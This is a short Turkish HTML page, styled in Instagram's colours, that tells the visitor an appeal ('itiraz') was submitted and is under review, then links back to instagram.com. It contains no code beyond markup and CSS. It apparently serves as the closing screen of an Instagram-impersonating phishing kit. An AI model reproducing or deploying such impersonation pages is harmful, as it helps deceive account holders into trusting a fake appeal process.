<!DOCTYPE html>
<html lang="tr-TR">

<head>
    <meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
    <meta name="generator" content="2018.1.1.386" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>İtiraz Gönderildi ve İnceleniyor</title>
    <link rel="icon" type="image/png" href="ımg/favicon.png">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        #response-container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            animation: fadeIn 0.5s ease;
            margin: 0 auto; /* yatay olarak ortala */
        }

        #response-container h2 {
            color: #0095f6; /* Yazının rengini ayarla */
        }

        #response-container p {
            margin-bottom: 20px;
            color: #555;
        }

        .btn-action {
            display: inline-block;
            padding: 10px 20px;
            background-color: #0095f6;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        .btn-action:hover {
            background-color: #005f96;
        }
    </style>
</head>

<body>
    <div id="response-container">
        <h2>İtiraz Gönderildi ve İnceleniyor</h2>
        <p>İtirazınız başarıyla gönderildi. İnceleniyor. Lütfen sabırla bekleyin.</p>
        <a href="https://instagram.com" class="btn-action">Çıkış Yap</a>
    </div>
</body>

</html>
